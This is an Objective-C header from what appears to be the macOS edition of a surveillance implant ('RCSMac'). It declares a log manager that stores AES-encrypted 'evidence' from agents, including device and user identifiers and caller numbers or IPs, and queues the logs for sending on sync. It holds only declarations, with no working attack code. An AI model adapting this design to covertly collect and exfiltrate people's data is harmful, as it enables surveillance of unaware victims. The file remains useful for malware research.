/*
 * RCSMac - Log Manager
 *  Logging facilities, this class is a singleton which will be referenced
 *  by all the single agents providing ways for writing log data per agentID
 *  or agentLogFileHandle.
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 16/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMLogManager_h__
#define __RCSMLogManager_h__

#import "RCSMCommon.h"
#import "NSMutableData+AES128.h"

//
// First DWORD is not encrypted and specifies:
// sizeof(logStruct)
// + deviceIdLen
// + userIdLen
// + sourceIdLen
// + uAdditionalData
//
typedef struct _log {
  u_int version;
#define LOG_VERSION   2008121901
  u_int type;
  u_int hiTimestamp;
  u_int loTimestamp;
  u_int deviceIdLength;       // IMEI/Hostname len
  u_int userIdLength;         // IMSI/Username len
  u_int sourceIdLength;       // Caller Number / IP length
  u_int additionalDataLength; // Size of additional data if present
} logStruct;

@class __m_MEncryption;

//
// Basically there are 2 possible queues:
// - Active, all the logs currently opened are stored here
// - Send, all the closed logs ready to be sent are stored here
// On Sync what happen is that we close all the logs and switch them in the Send
// queue so that they can all be sent
// NOTE: The Switch operation is transparent for all the agents, they will just
//       keep calling writeDataToLog(), switchLogsBetweenQueues() will also recreate
//       a new empty log inside the kActiveQueue for all the agents that were there
//
enum {
  kActiveQueue = 2,
  kSendQueue   = 1,
};

//
// A Log Entry (NSMutableDictionary) contained in queues is composed of:
//  - agentID
//  - logName
//  - handle

@interface __m_MLogManager : NSObject
{
@private
  NSMutableArray *mActiveQueue;
  NSMutableArray *mSendQueue;
  NSMutableArray *mTempQueue;
  
@private
  __m_MEncryption *mEncryption;
}

+ (__m_MLogManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)updateLogQueue;


// jo
// create an encrypted data to be logged as a proxy evidence
- (NSMutableData *)prepareDataToLog: (NSMutableData *) evidenceData evidenceHeader: (NSData *)anEvidenceHeader forAgentID: (u_int)logID;

//
// @author
//  revenge
// @abstract
//  Main function used to create a log for the given agent.
//  Accepts logID in order to allow (1 Agent -> n logs)
//
- (BOOL)createLog: (u_int)agentID
      agentHeader: (NSData *)anAgentHeader
        withLogID: (u_int)logID;

//
// @author
//  revenge
// @abstract
//  Writes data to log referenced by anHandle
//
- (BOOL)writeDataToLog: (NSData *)aData
             forHandle: (NSFileHandle *)anHandle;

//
// @author
//  revenge
// @abstract
//  Writes data to log referenced by agentID + logID
//
- (BOOL)writeDataToLog: (NSMutableData *)aData
              forAgent: (u_int)agentID
             withLogID: (u_int)logID;

//
// @author
//  revenge
// @abstract
//  Close ALL the logs in the mActiveQueue and move them inside the mSendQueue
//
- (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;

//
// @author
//  revenge
// @abstract
//  Remove a single log from the mSendQueue
//
- (BOOL)removeSendLog: (u_int)agentID
            withLogID: (u_int)logID;;
//
// @author
//  revenge
// @abstract
//  Close a single active log and move it to the mSendQueue
//
- (BOOL)closeActiveLog: (u_int)agentID
             withLogID: (u_int)logID;

- (NSMutableArray *)mActiveQueue;
- (NSEnumerator *)getActiveQueueEnumerator;
- (NSEnumerator *)getSendQueueEnumerator;

@end

#endif